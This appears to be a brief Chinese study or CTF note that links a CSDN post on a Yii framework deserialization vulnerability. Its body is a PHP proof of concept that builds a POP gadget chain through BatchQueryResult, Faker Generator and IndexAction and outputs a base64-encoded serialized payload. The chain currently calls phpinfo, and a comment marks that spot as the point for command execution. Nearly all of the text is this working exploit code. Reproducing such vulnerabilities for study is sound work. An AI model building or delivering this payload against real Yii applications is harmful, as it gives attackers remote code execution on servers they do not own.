# 知识点
[yii反序列化漏洞复现及利用_Snakin_ya的博客-CSDN博客_yii 漏洞](https://blog.csdn.net/cosmoslin/article/details/120612714)
# 思路
```plsql
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';				//命令执行
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{

    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}

```
